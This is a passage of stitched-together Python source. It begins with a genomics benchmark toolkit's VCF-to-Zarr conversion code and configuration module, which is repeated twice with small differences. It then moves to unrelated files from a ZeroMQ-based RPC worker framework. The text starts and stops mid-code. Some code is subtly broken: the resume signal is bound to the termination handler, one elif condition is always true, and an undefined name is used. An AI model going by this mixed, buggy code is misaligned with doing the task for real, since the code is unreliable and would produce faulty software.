            print("[VCF-Zarr] Using alt number provided in configuration.")
            # Use the configuration-provided alt number
            alt_number = conversion_config.alt_number
        print("[VCF-Zarr] Alt number: {}".format(alt_number))

        # Get chunk length
        chunk_length = allel.vcf_read.DEFAULT_CHUNK_LENGTH
        if conversion_config.chunk_length is not None:
            chunk_length = conversion_config.chunk_length
        print("[VCF-Zarr] Chunk length: {}".format(chunk_length))

        # Get chunk width
        chunk_width = allel.vcf_read.DEFAULT_CHUNK_WIDTH
        if conversion_config.chunk_width is not None:
            chunk_width = conversion_config.chunk_width
        print("[VCF-Zarr] Chunk width: {}".format(chunk_width))

        if conversion_config.compressor == "Blosc":
            compressor = Blosc(cname=conversion_config.blosc_compression_algorithm,
                               clevel=conversion_config.blosc_compression_level,
                               shuffle=conversion_config.blosc_shuffle_mode)
        else:
            raise ValueError("Unexpected compressor type specified.")

        print("[VCF-Zarr] Using {} compressor.".format(conversion_config.compressor))                    

        print("[VCF-Zarr] Performing VCF to Zarr conversion...")                    
        # Perform the VCF to Zarr conversion
        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,                    
                          log=sys.stdout, compressor=compressor, chunk_length=chunk_length, chunk_width=chunk_width)
        print("[VCF-Zarr] Done.")                    

from configparser import ConfigParser
from shutil import copyfile
import os.path
from pkg_resources import resource_string
from numcodecs import Blosc


def config_str_to_bool(input_str):
    """
    :param input_str: The input string to convert to bool value
    :type input_str: str
    :return: bool
    """
    return input_str.lower() in ['true', '1', 't', 'y', 'yes']


class DataDirectoriesConfigurationRepresentation:
    input_dir = "./data/input/"
    download_dir = input_dir + "download/"
    temp_dir = "./data/temp/"
    vcf_dir = "./data/vcf/"
    zarr_dir_setup = "./data/zarr/"
    zarr_dir_benchmark = "./data/zarr_benchmark/"


def isint(value):
    try:
        int(value)
        return True
    except ValueError:
        return False


def isfloat(value):
    try:
        float(value)
        return True
    except ValueError:
        return False


class ConfigurationRepresentation(object):
    """ A small utility class for object representation of a standard config. file. """

    def __init__(self, file_name):
        """ Initializes the configuration representation with a supplied file. """
        parser = ConfigParser()
        parser.optionxform = str  # make option names case sensitive
        found = parser.read(file_name)
        if not found:
            raise ValueError("Configuration file {0} not found".format(file_name))
        for name in parser.sections():
            dict_section = {name: dict(parser.items(name))}  # create dictionary representation for section
            self.__dict__.update(dict_section)  # add section dictionary to root dictionary


class FTPConfigurationRepresentation(object):
    """ Utility class for object representation of FTP module configuration. """
    enabled = False  # Specifies whether the FTP module should be enabled or not
    server = ""  # FTP server to connect to
    username = ""  # Username to login with. Set username and password to blank for anonymous login
    password = ""  # Password to login with. Set username and password to blank for anonymous login
    use_tls = False  # Whether the connection should use TLS encryption
    directory = ""  # Directory on FTP server to download files from
    files = []  # List of files within directory to download. Set to empty list to download all files within directory

    def __init__(self, runtime_config=None):
        """
        Creates an object representation of FTP module configuration data.
        :param runtime_config: runtime_config data to extract FTP settings from
        :type runtime_config: ConfigurationRepresentation
        """
        if runtime_config is not None:
            # Check if [ftp] section exists in config
            if hasattr(runtime_config, "ftp"):
                # Extract relevant settings from config file
                if "enabled" in runtime_config.ftp:
                    self.enabled = config_str_to_bool(runtime_config.ftp["enabled"])
                if "server" in runtime_config.ftp:
                    self.server = runtime_config.ftp["server"]
                if "username" in runtime_config.ftp:
                    self.username = runtime_config.ftp["username"]
                if "password" in runtime_config.ftp:
                    self.password = runtime_config.ftp["password"]
                if "use_tls" in runtime_config.ftp:
                    self.use_tls = config_str_to_bool(runtime_config.ftp["use_tls"])
                if "directory" in runtime_config.ftp:
                    self.directory = runtime_config.ftp["directory"]

                # Convert delimited list of files (string) to Python-style list
                if "file_delimiter" in runtime_config.ftp:
                    delimiter = runtime_config.ftp["file_delimiter"]
                else:
                    delimiter = "|"

                if "files" in runtime_config.ftp:
                    files_str = str(runtime_config.ftp["files"])
                    if files_str == "*":
                        self.files = []
                    else:
                        self.files = files_str.split(delimiter)


vcf_to_zarr_compressor_types = ["Blosc"]
vcf_to_zarr_blosc_algorithm_types = ["zstd", "blosclz", "lz4", "lz4hc", "zlib", "snappy"]
vcf_to_zarr_blosc_shuffle_types = [Blosc.NOSHUFFLE, Blosc.SHUFFLE, Blosc.BITSHUFFLE, Blosc.AUTOSHUFFLE]


class VCFtoZarrConfigurationRepresentation:
    """ Utility class for object representation of VCF to Zarr conversion module configuration. """
    enabled = False  # Specifies whether the VCF to Zarr conversion module should be enabled or not
    fields = None
    alt_number = None  # Alt number to use when converting to Zarr format. If None, then this will need to be determined
    chunk_length = None  # Number of variants of chunks in which data are processed. If None, use default value
    chunk_width = None  # Number of samples to use when storing chunks in output. If None, use default value
    compressor = "Blosc"  # Specifies compressor type to use for Zarr conversion
    blosc_compression_algorithm = "zstd"
    blosc_compression_level = 1  # Level of compression to use for Zarr conversion
    blosc_shuffle_mode = Blosc.AUTOSHUFFLE

    def __init__(self, runtime_config=None):
        """
        Creates an object representation of VCF to Zarr Conversion module configuration data.
        :param runtime_config: runtime_config data to extract conversion configuration from
        :type runtime_config: ConfigurationRepresentation
        """
        if runtime_config is not None:
            # Check if [vcf_to_zarr] section exists in config
            if hasattr(runtime_config, "vcf_to_zarr"):
                # Extract relevant settings from config file
                if "enabled" in runtime_config.vcf_to_zarr:
                    self.enabled = config_str_to_bool(runtime_config.vcf_to_zarr["enabled"])
                if "alt_number" in runtime_config.vcf_to_zarr:
                    alt_number_str = runtime_config.vcf_to_zarr["alt_number"]

                    if str(alt_number_str).lower() == "auto":
                        self.alt_number = None
                    elif isint(alt_number_str):
                        self.alt_number = int(alt_number_str)
                    else:
                        raise TypeError("Invalid value provided for alt_number in configuration.\n"
                                        "Expected: \"auto\" or integer value")
                if "chunk_length" in runtime_config.vcf_to_zarr:
                    chunk_length_str = runtime_config.vcf_to_zarr["chunk_length"]
                    if chunk_length_str == "default":
                        self.chunk_length = None
                    elif isint(chunk_length_str):
                        self.chunk_length = int(chunk_length_str)
                    else:
                        raise TypeError("Invalid value provided for chunk_length in configuration.\n"
                                        "Expected: \"default\" or integer value")
                if "chunk_width" in runtime_config.vcf_to_zarr:
                    chunk_width_str = runtime_config.vcf_to_zarr["chunk_width"]
                    if chunk_width_str == "default":
                        self.chunk_width = None
                    elif isint(chunk_width_str):
                        self.chunk_width = int(chunk_width_str)
                    else:
                        raise TypeError("Invalid value provided for chunk_width in configuration.\n"
                                        "Expected: \"default\" or integer value")
                if "compressor" in runtime_config.vcf_to_zarr:
                    compressor_temp = runtime_config.vcf_to_zarr["compressor"]
                    # Ensure compressor type specified is valid
                    if compressor_temp in vcf_to_zarr_compressor_types:
                        self.compressor = compressor_temp
                if "blosc_compression_algorithm" in runtime_config.vcf_to_zarr:
                    blosc_compression_algorithm_temp = runtime_config.vcf_to_zarr["blosc_compression_algorithm"]
                    if blosc_compression_algorithm_temp in vcf_to_zarr_blosc_algorithm_types:
                        self.blosc_compression_algorithm = blosc_compression_algorithm_temp
                if "blosc_compression_level" in runtime_config.vcf_to_zarr:
                    blosc_compression_level_str = runtime_config.vcf_to_zarr["blosc_compression_level"]
                    if isint(blosc_compression_level_str):
                        compression_level_int = int(blosc_compression_level_str)
                        if (compression_level_int >= 0) and (compression_level_int <= 9):
                            self.blosc_compression_level = compression_level_int
                        else:
                            raise ValueError("Invalid value for blosc_compression_level in configuration.\n"
                                             "blosc_compression_level must be between 0 and 9.")
                    else:
                        raise TypeError("Invalid value for blosc_compression_level in configuration.\n"
                                        "blosc_compression_level could not be converted to integer.")
                if "blosc_shuffle_mode" in runtime_config.vcf_to_zarr:
                    blosc_shuffle_mode_str = runtime_config.vcf_to_zarr["blosc_shuffle_mode"]
                    if isint(blosc_shuffle_mode_str):
                        blosc_shuffle_mode_int = int(blosc_shuffle_mode_str)
                        if blosc_shuffle_mode_int in vcf_to_zarr_blosc_shuffle_types:
                            self.blosc_shuffle_mode = blosc_shuffle_mode_int
                        else:
                            raise ValueError("Invalid value for blosc_shuffle_mode in configuration.\n"
                                             "blosc_shuffle_mode must be a valid integer.")
                    else:
                        raise TypeError("Invalid value for blosc_shuffle_mode in configuration.\n"
                                        "blosc_shuffle_mode could not be converted to integer.")


benchmark_data_input_types = ["vcf", "zarr"]


class BenchmarkConfigurationRepresentation:
    """ Utility class for object representation of the benchmark module's configuration. """
    benchmark_number_runs = 5
    benchmark_data_input = "vcf"
    benchmark_dataset = ""
    benchmark_allele_count = False                    
    benchmark_PCA = False
    vcf_to_zarr_config = None

    def __init__(self, runtime_config=None):
        """
        Creates an object representation of the Benchmark module's configuration data.
        :param runtime_config: runtime_config data to extract benchmark configuration from
        :type runtime_config: ConfigurationRepresentation
        """
        if runtime_config is not None:
            if hasattr(runtime_config, "benchmark"):
                # Extract relevant settings from config file
                if "benchmark_number_runs" in runtime_config.benchmark:
                    try:
                        self.benchmark_number_runs = int(runtime_config.benchmark["benchmark_number_runs"])
                    except ValueError:
                        pass
                if "benchmark_data_input" in runtime_config.benchmark:
                    benchmark_data_input_temp = runtime_config.benchmark["benchmark_data_input"]
                    if benchmark_data_input_temp in benchmark_data_input_types:
                        self.benchmark_data_input = benchmark_data_input_temp
                if "benchmark_dataset" in runtime_config.benchmark:
                    self.benchmark_dataset = runtime_config.benchmark["benchmark_dataset"]
                if "benchmark_allele_count" in runtime_config.benchmark:                    
                    self.benchmark_allele_count = config_str_to_bool(runtime_config.benchmark["benchmark_allele_count"])                    
                if "benchmark_PCA" in runtime_config.benchmark:
                    self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark["benchmark_PCA"])

            # Add the VCF to Zarr Conversion Configuration Data
            self.vcf_to_zarr_config = VCFtoZarrConfigurationRepresentation(runtime_config=runtime_config)


def read_configuration(location):
    """
    Args: location of the configuration file, existing configuration dictionary
    Returns: a dictionary of the form
    <dict>.<section>[<option>] and the corresponding values.
    """
    config = ConfigurationRepresentation(location)
    return config


def generate_default_config_file(output_location, overwrite=False):
    # Get Default Config File Data as Package Resource
    default_config_file_data = resource_string(__name__, 'config/benchmark.conf.default')

    if overwrite is None:
        overwrite = False

    if output_location is not None:
        # Check if a file currently exists at the location
        if os.path.exists(output_location) and not overwrite:
            print(
                "[Config] Could not generate configuration file: file exists at specified destination and overwrite mode disabled.")
            return

        # Write the default configuration file to specified location
        with open(output_location, 'wb') as output_file:
            output_file.write(default_config_file_data)

        # Check whether configuration file now exists and report status
        if os.path.exists(output_location):
            print("[Config] Configuration file has been generated successfully.")
        else:
            print("[Config] Configuration file was not generated.")

from configparser import ConfigParser
from shutil import copyfile
import os.path
from pkg_resources import resource_string
from numcodecs import Blosc


def config_str_to_bool(input_str):
    """
    :param input_str: The input string to convert to bool value
    :type input_str: str
    :return: bool
    """
    return input_str.lower() in ['true', '1', 't', 'y', 'yes']


class DataDirectoriesConfigurationRepresentation:
    input_dir = "./data/input/"
    download_dir = input_dir + "download/"
    temp_dir = "./data/temp/"
    vcf_dir = "./data/vcf/"
    zarr_dir_setup = "./data/zarr/"
    zarr_dir_benchmark = "./data/zarr_benchmark/"


def isint(value):
    try:
        int(value)
        return True
    except ValueError:
        return False


def isfloat(value):
    try:
        float(value)
        return True
    except ValueError:
        return False


class ConfigurationRepresentation(object):
    """ A small utility class for object representation of a standard config. file. """

    def __init__(self, file_name):
        """ Initializes the configuration representation with a supplied file. """
        parser = ConfigParser()
        parser.optionxform = str  # make option names case sensitive
        found = parser.read(file_name)
        if not found:
            raise ValueError("Configuration file {0} not found".format(file_name))
        for name in parser.sections():
            dict_section = {name: dict(parser.items(name))}  # create dictionary representation for section
            self.__dict__.update(dict_section)  # add section dictionary to root dictionary


class FTPConfigurationRepresentation(object):
    """ Utility class for object representation of FTP module configuration. """
    enabled = False  # Specifies whether the FTP module should be enabled or not
    server = ""  # FTP server to connect to
    username = ""  # Username to login with. Set username and password to blank for anonymous login
    password = ""  # Password to login with. Set username and password to blank for anonymous login
    use_tls = False  # Whether the connection should use TLS encryption
    directory = ""  # Directory on FTP server to download files from
    files = []  # List of files within directory to download. Set to empty list to download all files within directory

    def __init__(self, runtime_config=None):
        """
        Creates an object representation of FTP module configuration data.
        :param runtime_config: runtime_config data to extract FTP settings from
        :type runtime_config: ConfigurationRepresentation
        """
        if runtime_config is not None:
            # Check if [ftp] section exists in config
            if hasattr(runtime_config, "ftp"):
                # Extract relevant settings from config file
                if "enabled" in runtime_config.ftp:
                    self.enabled = config_str_to_bool(runtime_config.ftp["enabled"])
                if "server" in runtime_config.ftp:
                    self.server = runtime_config.ftp["server"]
                if "username" in runtime_config.ftp:
                    self.username = runtime_config.ftp["username"]
                if "password" in runtime_config.ftp:
                    self.password = runtime_config.ftp["password"]
                if "use_tls" in runtime_config.ftp:
                    self.use_tls = config_str_to_bool(runtime_config.ftp["use_tls"])
                if "directory" in runtime_config.ftp:
                    self.directory = runtime_config.ftp["directory"]

                # Convert delimited list of files (string) to Python-style list
                if "file_delimiter" in runtime_config.ftp:
                    delimiter = runtime_config.ftp["file_delimiter"]
                else:
                    delimiter = "|"

                if "files" in runtime_config.ftp:
                    files_str = str(runtime_config.ftp["files"])
                    if files_str == "*":
                        self.files = []
                    else:
                        self.files = files_str.split(delimiter)


vcf_to_zarr_compressor_types = ["Blosc"]
vcf_to_zarr_blosc_algorithm_types = ["zstd", "blosclz", "lz4", "lz4hc", "zlib", "snappy"]
vcf_to_zarr_blosc_shuffle_types = [Blosc.NOSHUFFLE, Blosc.SHUFFLE, Blosc.BITSHUFFLE, Blosc.AUTOSHUFFLE]


class VCFtoZarrConfigurationRepresentation:
    """ Utility class for object representation of VCF to Zarr conversion module configuration. """
    enabled = False  # Specifies whether the VCF to Zarr conversion module should be enabled or not
    fields = None
    alt_number = None  # Alt number to use when converting to Zarr format. If None, then this will need to be determined
    chunk_length = None  # Number of variants of chunks in which data are processed. If None, use default value
    chunk_width = None  # Number of samples to use when storing chunks in output. If None, use default value
    compressor = "Blosc"  # Specifies compressor type to use for Zarr conversion
    blosc_compression_algorithm = "zstd"
    blosc_compression_level = 1  # Level of compression to use for Zarr conversion
    blosc_shuffle_mode = Blosc.AUTOSHUFFLE

    def __init__(self, runtime_config=None):
        """
        Creates an object representation of VCF to Zarr Conversion module configuration data.
        :param runtime_config: runtime_config data to extract conversion configuration from
        :type runtime_config: ConfigurationRepresentation
        """
        if runtime_config is not None:
            # Check if [vcf_to_zarr] section exists in config
            if hasattr(runtime_config, "vcf_to_zarr"):
                # Extract relevant settings from config file
                if "enabled" in runtime_config.vcf_to_zarr:
                    self.enabled = config_str_to_bool(runtime_config.vcf_to_zarr["enabled"])
                if "alt_number" in runtime_config.vcf_to_zarr:
                    alt_number_str = runtime_config.vcf_to_zarr["alt_number"]

                    if str(alt_number_str).lower() == "auto":
                        self.alt_number = None
                    elif isint(alt_number_str):
                        self.alt_number = int(alt_number_str)
                    else:
                        raise TypeError("Invalid value provided for alt_number in configuration.\n"
                                        "Expected: \"auto\" or integer value")
                if "chunk_length" in runtime_config.vcf_to_zarr:
                    chunk_length_str = runtime_config.vcf_to_zarr["chunk_length"]
                    if chunk_length_str == "default":
                        self.chunk_length = None
                    elif isint(chunk_length_str):
                        self.chunk_length = int(chunk_length_str)
                    else:
                        raise TypeError("Invalid value provided for chunk_length in configuration.\n"
                                        "Expected: \"default\" or integer value")
                if "chunk_width" in runtime_config.vcf_to_zarr:
                    chunk_width_str = runtime_config.vcf_to_zarr["chunk_width"]
                    if chunk_width_str == "default":
                        self.chunk_width = None
                    elif isint(chunk_width_str):
                        self.chunk_width = int(chunk_width_str)
                    else:
                        raise TypeError("Invalid value provided for chunk_width in configuration.\n"
                                        "Expected: \"default\" or integer value")
                if "compressor" in runtime_config.vcf_to_zarr:
                    compressor_temp = runtime_config.vcf_to_zarr["compressor"]
                    # Ensure compressor type specified is valid
                    if compressor_temp in vcf_to_zarr_compressor_types:
                        self.compressor = compressor_temp
                if "blosc_compression_algorithm" in runtime_config.vcf_to_zarr:
                    blosc_compression_algorithm_temp = runtime_config.vcf_to_zarr["blosc_compression_algorithm"]
                    if blosc_compression_algorithm_temp in vcf_to_zarr_blosc_algorithm_types:
                        self.blosc_compression_algorithm = blosc_compression_algorithm_temp
                if "blosc_compression_level" in runtime_config.vcf_to_zarr:
                    blosc_compression_level_str = runtime_config.vcf_to_zarr["blosc_compression_level"]
                    if isint(blosc_compression_level_str):
                        compression_level_int = int(blosc_compression_level_str)
                        if (compression_level_int >= 0) and (compression_level_int <= 9):
                            self.blosc_compression_level = compression_level_int
                        else:
                            raise ValueError("Invalid value for blosc_compression_level in configuration.\n"
                                             "blosc_compression_level must be between 0 and 9.")
                    else:
                        raise TypeError("Invalid value for blosc_compression_level in configuration.\n"
                                        "blosc_compression_level could not be converted to integer.")
                if "blosc_shuffle_mode" in runtime_config.vcf_to_zarr:
                    blosc_shuffle_mode_str = runtime_config.vcf_to_zarr["blosc_shuffle_mode"]
                    if isint(blosc_shuffle_mode_str):
                        blosc_shuffle_mode_int = int(blosc_shuffle_mode_str)
                        if blosc_shuffle_mode_int in vcf_to_zarr_blosc_shuffle_types:
                            self.blosc_shuffle_mode = blosc_shuffle_mode_int
                        else:
                            raise ValueError("Invalid value for blosc_shuffle_mode in configuration.\n"
                                             "blosc_shuffle_mode must be a valid integer.")
                    else:
                        raise TypeError("Invalid value for blosc_shuffle_mode in configuration.\n"
                                        "blosc_shuffle_mode could not be converted to integer.")


benchmark_data_input_types = ["vcf", "zarr"]


class BenchmarkConfigurationRepresentation:
    """ Utility class for object representation of the benchmark module's configuration. """
    benchmark_number_runs = 5
    benchmark_data_input = "vcf"
    benchmark_dataset = ""
    benchmark_aggregations = False
    benchmark_PCA = False                    
    vcf_to_zarr_config = None

    def __init__(self, runtime_config=None):
        """
        Creates an object representation of the Benchmark module's configuration data.
        :param runtime_config: runtime_config data to extract benchmark configuration from
        :type runtime_config: ConfigurationRepresentation
        """
        if runtime_config is not None:
            if hasattr(runtime_config, "benchmark"):
                # Extract relevant settings from config file
                if "benchmark_number_runs" in runtime_config.benchmark:
                    try:
                        self.benchmark_number_runs = int(runtime_config.benchmark["benchmark_number_runs"])
                    except ValueError:
                        pass
                if "benchmark_data_input" in runtime_config.benchmark:
                    benchmark_data_input_temp = runtime_config.benchmark["benchmark_data_input"]
                    if benchmark_data_input_temp in benchmark_data_input_types:
                        self.benchmark_data_input = benchmark_data_input_temp
                if "benchmark_dataset" in runtime_config.benchmark:
                    self.benchmark_dataset = runtime_config.benchmark["benchmark_dataset"]
                if "benchmark_aggregations" in runtime_config.benchmark:
                    self.benchmark_aggregations = config_str_to_bool(runtime_config.benchmark["benchmark_aggregations"])
                if "benchmark_PCA" in runtime_config.benchmark:                    
                    self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark["benchmark_PCA"])                    

            # Add the VCF to Zarr Conversion Configuration Data
            self.vcf_to_zarr_config = VCFtoZarrConfigurationRepresentation(runtime_config=runtime_config)


def read_configuration(location):
    """
    Args: location of the configuration file, existing configuration dictionary
    Returns: a dictionary of the form
    <dict>.<section>[<option>] and the corresponding values.
    """
    config = ConfigurationRepresentation(location)
    return config


def generate_default_config_file(output_location, overwrite=False):
    # Get Default Config File Data as Package Resource
    default_config_file_data = resource_string(__name__, 'config/benchmark.conf.default')

    if overwrite is None:
        overwrite = False

    if output_location is not None:
        # Check if a file currently exists at the location
        if os.path.exists(output_location) and not overwrite:
            print(
                "[Config] Could not generate configuration file: file exists at specified destination and overwrite mode disabled.")
            return

        # Write the default configuration file to specified location
        with open(output_location, 'wb') as output_file:
            output_file.write(default_config_file_data)

        # Check whether configuration file now exists and report status
        if os.path.exists(output_location):
            print("[Config] Configuration file has been generated successfully.")
        else:
            print("[Config] Configuration file was not generated.")

# -*- coding: utf-8 -*-
# -*- mode: python -*-
import wzrpc
from sup.ticker import Ticker

class EvaluatorProxy:
    def __init__(self, ev_init, *args, **kvargs):
        super().__init__()
        self.ev_init = ev_init
        self.bind_kt_ticker = Ticker()
        self.bind_kt = 5

    def handle_evaluate(self, reqid, interface, method, data):
        domain, page = data
        self.p.log.info('Recvd page %s, working on', reqid)
        res = self.ev.solve_capage(domain, page)
        self.p.log.info('Done, sending answer: %s', res)
        self.p.send_success_rep(reqid, [v.encode('utf-8') for v in res])

    def send_keepalive(self):
        msg = self.p.wz.make_req_msg(b'Router', b'bind-keepalive', [],
            self.handle_keepalive_reply)
        msg.insert(0, b'')
        self.p.wz_sock.send_multipart(msg)

    def handle_keepalive_reply(self, reqid, seqnum, status, data):
        if status == wzrpc.status.success:
            self.p.log.debug('Keepalive was successfull')
        elif status == wzrpc.status.e_req_denied:
            self.p.log.warn('Keepalive status {0}, reauthentificating and rebinding'.
                format(wzrpc.name_status(status)))
            self.p.auth_requests()
            self.p.bind_methods()
        elif status == wzrpc.status.e_timeout:
            self.p.log.warn('Keepalive timeout')
        else:
            self.p.log.warn('Keepalive status {0}'.
                format(wzrpc.name_status(status)))

    def __call__(self, parent):
        self.p = parent
        self.p.wz_connect()
        self.p.wz_auth_requests = [
            (b'Router', b'auth-bind-route'),
            (b'Router', b'auth-unbind-route'),
            (b'Router', b'auth-set-route-type')]
        self.p.wz_bind_methods = [
            (b'Evaluator', b'evaluate', self.handle_evaluate, wzrpc.routetype.random)]
        self.p.auth_requests()
        self.p.bind_methods()
        self.ev = self.ev_init()
        self.bind_kt_ticker.tick()
        while self.p.running.is_set():
            socks = self.p.poll()                    
            if self.bind_kt_ticker.elapsed(False) > self.bind_kt:
                self.bind_kt_ticker.tick()
                self.send_keepalive()

# -*- coding: utf-8 -*-
# -*- mode: python -*-
from . import *
from .wzbase import WZBase

class WZHandler(WZBase):
    def __init__(self):
        self.req_handlers = {}
        self.response_handlers = {}
        self.sig_handlers = {}
        self.iden_reqid_map = BijectiveSetMap()

    def set_req_handler(self, interface, method, fun):
        self.req_handlers[(interface, method)] = fun

    def set_response_handler(self, reqid, fun):
        self.response_handlers[reqid] = fun

    def set_sig_handler(self, interface, method, fun):
        self.sig_handlers[(interface, method)] = fun
    
    def del_req_handler(self, interface, method):
        del self.req_handlers[(interface, method)]

    def del_response_handler(self, reqid):
        del self.response_handlers[reqid]

    def del_sig_handler(self, interface, method):
        del self.sig_handlers[(interface, method)]

    def _parse_req(self, iden, msg, reqid, interface, method):
        try:
            handler = self.req_handlers[(interface, method)]
        except KeyError:
            try:
                handler = self.req_handlers[(interface, None)]
            except KeyError:
                raise WZENoReqHandler(iden, reqid,
                    'No req handler for %s,%s'%(interface, method))
        if iden:
            self.iden_reqid_map.add_value(tuple(iden), reqid)
        handler(reqid, interface, method, msg[1:])
        return ()

    def _parse_rep(self, iden, msg, reqid, seqnum, status):
        try:
            handler = self.response_handlers[reqid]
            if seqnum == 0:
                del self.response_handlers[reqid]
        except KeyError:
            raise WZENoHandler(iden, 'No rep handler for reqid')
        handler(reqid, seqnum, status, msg[1:])
        return ()

    def _parse_sig(self, iden, msg, interface, method):
        try:
            handler = self.sig_handlers[(interface, method)]
        except KeyError:
            raise WZENoHandler(iden, 'No handler for sig %s,%s'%(interface, method))
        handler(interface, method, msg[1:])
        return ()

    def make_req_msg(self, interface, method, args, fun, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        msg = make_req_msg(interface, method, args, reqid)
        self.set_response_handler(reqid, fun)
        return msg
    
    def make_router_req_msg(self, iden, interface, method, args, fun, reqid=None):
        msg = iden[:]
        msg.append(b'')
        msg.extend(self.make_req_msg(interface, method, args, fun, reqid))
        return msg
    
    def make_router_rep_msg(self, reqid, seqnum, status, answer):
        iden = self.iden_reqid_map.get_key(reqid)
        if seqnum == 0:
            self.iden_reqid_map.del_value(iden, reqid)
        msg = list(iden)
        msg.append(b'')
        msg.extend(make_rep_msg(reqid, seqnum, status, answer))
        return msg

    def get_iden(self, reqid):
        return self.iden_reqid_map.get_key(reqid)

    def get_reqids(self, iden):
        return self.iden_reqid_map.get_values(iden)

    def make_reqid(self):
        while True:
            reqid = random.randint(1, (2**64)-1)
            if not reqid in self.response_handlers:                    
                return reqid
        
    def make_auth_req_data(self, interface, method, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, make_auth_hash(interface, method, reqid, key)]
        return (b'Router', b'auth-request', args, reqid)

    def make_auth_bind_route_data(self, interface, method, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        
        return (b'Router', b'auth-bind-route', args, reqid)

    def make_auth_unbind_route_data(self, interface, method, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        
        return (b'Router', b'auth-unbind-route', args, reqid)

    def make_auth_set_route_type_data(self, interface, method, type_, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, struct.pack('!B', type_),
                make_auth_hash(interface, method, reqid, key)]
        return (b'Router', b'auth-set-route-type', args, reqid)

    def make_auth_clear_data(self, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        return (b'Router', b'auth-clear', [], reqid)

    def req_from_data(self, d, fun):
        return self.make_req_msg(d[0], d[1], d[2], fun, d[3])
  
    def _parse_err(self, iden, msg, status):
        pass

    def _handle_nil(self, iden, msg):
        pass

import zmq
import threading, multiprocessing
import logging
from sup.ticker import Ticker
# from sup import split_frames
import wzrpc
from wzrpc.wzhandler import WZHandler
import wzauth_data

class WorkerInterrupt(Exception):
    '''Exception to raise when self.running is cleared'''
    def __init__(self):
        super().__init__('Worker was interrupted at runtime')

class Suspend(Exception):
    # if we need this at all.
    '''Exception to raise on suspend signal'''
    def __init__(self, interval, *args, **kvargs):
        self.interval = interval
        super().__init__(*args, **kvargs)

class Resume(Exception):
    '''Exception to raise when suspend sleep is interrupted'''

class WZWorkerBase:
    def __init__(self, wz_addr, fun, args=(), kvargs={},
            name=None, start_timer=None, poll_timeout=None,
            pargs=(), pkvargs={}):
        super().__init__(*pargs, **pkvargs)
        self.name = name if name else type(self).__name__
        self.start_timer = start_timer
        self.poll_timeout = poll_timeout if poll_timeout else 5*1000
        self.call = (fun, args, kvargs)

        self.wz_addr = wz_addr
        self.wz_auth_requests = []
        self.wz_bind_methods = []
        self.wz_poll_timeout = 30                    

    def __sinit__(self):
        '''Initializes thread-local interface on startup'''
        self.log = logging.getLogger(self.name)
        self.running = threading.Event()
        self.sleep_ticker = Ticker()
        self.poller = zmq.Poller()

        s = self.ctx.socket(zmq.SUB)
        self.poller.register(s, zmq.POLLIN)
        s.setsockopt(zmq.IPV6, True)
        s.connect(self.sig_addr)
        s.setsockopt(zmq.SUBSCRIBE, b'GLOBAL')
        s.setsockopt(zmq.SUBSCRIBE, b'WZWorker')
        s.setsockopt(zmq.SUBSCRIBE, bytes(self.name, 'utf-8'))
        self.sig_sock = s

        s = self.ctx.socket(zmq.DEALER)
        self.poller.register(s, zmq.POLLIN)
        s.setsockopt(zmq.IPV6, True)
        self.wz_sock = s

        self.wz = WZHandler()

        def term_handler(interface, method, data):                    
            self.log.info(
                'Termination signal %s recieved',
                repr((interface, method, data)))                    
            self.term()
            raise WorkerInterrupt()
        self.wz.set_sig_handler(b'WZWorker', b'terminate', term_handler)

        def resumehandler(interface, method, data):                    
            self.log.info('Resume signal %s recieved',                    
                repr((interface, method, data)))                    
            raise Resume()

        self.wz.set_sig_handler(b'WZWorker', b'resume', term_handler)                    
        self.running.set()

    def wz_connect(self):
        self.wz_sock.connect(self.wz_addr)

    def wz_wait_reply(self, fun, interface, method, data, reqid=None, timeout=None):
        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz                    
        timeout = timeout if timeout else self.wz_poll_timeout
        rs = wzrpc.RequestState(fun)
        msg = self.wz.make_req_msg(interface, method, data,
                                   rs.accept, reqid)
        msg.insert(0, b'')
        s.send_multipart(msg)
        t.tick()
        while self.running.is_set():
            p(timeout*1000)
            if rs.finished:
                if rs.retry:
                    msg = self.wz.make_req_msg(interface, method, data,
                        rs.accept, reqid)
                    msg.insert(0, b'')
                    s.send_multipart(msg)
                    rs.finished = False
                    rs.retry = False
                    continue
                return
            elapsed = t.elapsed(False)
            if elapsed >= timeout:
                t.tick()
                # Notify fun about the timeout
                rs.accept(None, 0, 255, [elapsed])
                # fun sets rs.retry = True if it wants to retry
        raise WorkerInterrupt()
    
    def wz_multiwait(self, requests):
        # TODO: rewrite the retry loop
        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz                    
        timeout = self.wz_poll_timeout
        rslist = []
        msgdict = {}
        for request in requests:
            rs = wzrpc.RequestState(request[0])
            rslist.append(rs)
            msg = self.wz.make_req_msg(request[1][0], request[1][1], request[1][2],
                                    rs.accept, request[1][3])
            msg.insert(0, b'')
            msgdict[rs] = msg
            s.send_multipart(msg)
        while self.running.is_set():
            flag = 0
            for rs in rslist:
                if rs.finished:
                    if not rs.retry:
                        del msgdict[rs]
                        continue
                    s.send_multipart(msgdict[rs])
                    rs.finished = False
                    rs.retry = False
                flag = 1
            if not flag:
                return
            # check rs before polling, since we don't want to notify finished one
            # about the timeout
            t.tick()
            p(timeout*1000)
            if t.elapsed(False) >= timeout:
                for rs in rslist:
                    if not rs.finished:
                        rs.accept(None, 0, 255, []) # Notify fun about the timeout
                        rs.finished = True # fun sets rs.retry = True if it wants to retry
        raise WorkerInterrupt()

    def auth_requests(self):
        for i, m in self.wz_auth_requests:
            def accept(that, reqid, seqnum, status, data):
                if status == wzrpc.status.success:
                    self.log.debug('Successfull auth for (%s, %s)', i, m)
                elif status == wzrpc.status.e_auth_wrong_hash:
                    raise beon.PermanentError(                    
                        'Cannot authentificate for ({0}, {1}), {2}: {3}'.\
                        format(i, m, wzrpc.name_status(status), repr(data)))
                elif wzrpc.status.e_timeout:
